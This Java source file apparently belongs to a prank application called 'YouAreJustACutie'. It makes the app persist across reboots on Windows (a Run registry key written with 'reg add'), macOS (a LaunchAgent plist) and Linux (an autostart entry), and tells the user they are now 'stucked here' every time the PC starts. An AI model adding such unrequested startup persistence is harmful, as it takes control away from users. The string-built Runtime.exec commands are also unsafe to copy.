package fr.mimifan.jac.utils;

import fr.mimifan.jac.Main;

import java.io.*;
import java.net.URISyntaxException;

public class StartupRunning {

    public static void enableStartupWindows() {
        try {
            String runKey = "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run";
            String appName = "YouAreJustACutie";

            Process processCheck = Runtime.getRuntime().exec("reg query \"" + runKey + "\" /v " + appName);
            BufferedReader readerCheck = new BufferedReader(new InputStreamReader(processCheck.getInputStream()));
            String line;
            boolean entryExists = false;
            while ((line = readerCheck.readLine()) != null) {
                if (line.contains(appName)) {
                    entryExists = true;
                    break;
                }
            }
            readerCheck.close();

            if(!entryExists) {
                File currentJar = new File(Main.class.getProtectionDomain().getCodeSource().getLocation().toURI().getPath());

                Process runOnStartupProcess = Runtime.getRuntime().exec(
                        "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v YouAreJustACutie /t REG_SZ /d \"java -jar " + currentJar.getPath() + "\"");

                BufferedReader outputReader = new BufferedReader(new InputStreamReader(runOnStartupProcess.getInputStream()));
                String outputLine;
                while ((outputLine = outputReader.readLine()) != null) System.out.println(outputLine);

                runOnStartupProcess.waitFor();
                outputReader.close();
                System.out.println("There there, now you should be stucked here everytime you start your pc :3");
            }
        } catch (InterruptedException | IOException | URISyntaxException e) {
            e.printStackTrace();
        }

    }

    public static void enableStartupMac() {
        String jarDirectory = System.getProperty("user.dir");
        File jarFile = findJarFile(jarDirectory);

        if (jarFile != null) {
            String scriptContent = generateMacScript(jarDirectory, jarFile.getName());

            String scriptPath = jarDirectory + "/install.sh";
            writeScript(scriptPath, scriptContent);
            makeExecutable(scriptPath);
            executeScript(scriptPath);
        } else {
            System.out.println("Error: No JAR file found in the directory.");
        }
    }

    public static void enableStartupLinux() {
        String jarDirectory = System.getProperty("user.dir");
        File jarFile = findJarFile(jarDirectory);

        if (jarFile != null) {
            String scriptContent = generateLinuxScript(jarDirectory, jarFile.getName());

            String scriptPath = jarDirectory + "/install.sh";
            writeScript(scriptPath, scriptContent);
            makeExecutable(scriptPath);
            executeScript(scriptPath);
        } else {
            System.out.println("Error: No JAR file found in the directory.");
        }
    }

    private static File findJarFile(String directory) {
        File dir = new File(directory);
        File[] files = dir.listFiles((d, name) -> name.endsWith(".jar"));
        if (files != null && files.length > 0) {
            return files[0];
        }
        return null;
    }

    private static String generateMacScript(String directory, String jarFileName) {
        return "#!/bin/bash\n\n" +
                "# Get the directory of the JAR file\n" +
                "DIR=\"" + directory + "\"\n\n" +
                "# Create the plist file\n" +
                "PLIST_FILE=\"$HOME/Library/LaunchAgents/fr.mimifan.jac.Main.plist\"\n" +
                "cat <<EOF > \"$PLIST_FILE\"\n" +
                "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n" +
                "<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\n" +
                "<plist version=\"1.0\">\n" +
                "<dict>\n" +
                "    <key>Label</key>\n" +
                "    <string>com.yourapp.autostart</string>\n" +
                "    <key>ProgramArguments</key>\n" +
                "    <array>\n" +
                "        <string>/usr/bin/java</string>\n" +
                "        <string>-jar</string>\n" +
                "        <string>$DIR/" + jarFileName + "</string>\n" +
                "    </array>\n" +
                "    <key>RunAtLoad</key>\n" +
                "    <true/>\n" +
                "</dict>\n" +
                "</plist>\n" +
                "EOF\n\n" +
                "# Load the plist file\n" +
                "launchctl load \"$PLIST_FILE\"";
    }

    private static String generateLinuxScript(String directory, String jarFileName) {
        return "#!/bin/bash\n\n" +
                "# Get the directory of the JAR file\n" +
                "DIR=\"" + directory + "\"\n\n" +
                "# Create the autostart desktop file\n" +
                "AUTOSTART_FILE=\"$HOME/.config/autostart/com.yourapp.desktop\"\n" +
                "cat <<EOF > \"$AUTOSTART_FILE\"\n" +
                "[Desktop Entry]\n" +
                "Type=Application\n" +
                "Exec=/usr/bin/java -jar \"$DIR/" + jarFileName + "\"\n" +
                "Hidden=false\n" +
                "NoDisplay=false\n" +
                "X-GNOME-Autostart-enabled=true\n" +
                "Name[en_US]=YourApp\n" +
                "Name=YourApp\n" +
                "Comment[en_US]=YourApp Description\n" +
                "Comment=YourApp Description\n" +
                "EOF\n";
    }

    private static void writeScript(String path, String content) {
        try (BufferedWriter writer = new BufferedWriter(new FileWriter(path))) {
            writer.write(content);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    private static void makeExecutable(String path) {
        try {
            Process proc = Runtime.getRuntime().exec("chmod +x " + path);
            proc.waitFor();
        } catch (IOException | InterruptedException e) {
            e.printStackTrace();
        }
    }

    private static void executeScript(String path) {
        try {
            Process proc = Runtime.getRuntime().exec(path);
            proc.waitFor();
        } catch (IOException | InterruptedException e) {
            e.printStackTrace();
        }
    }

}
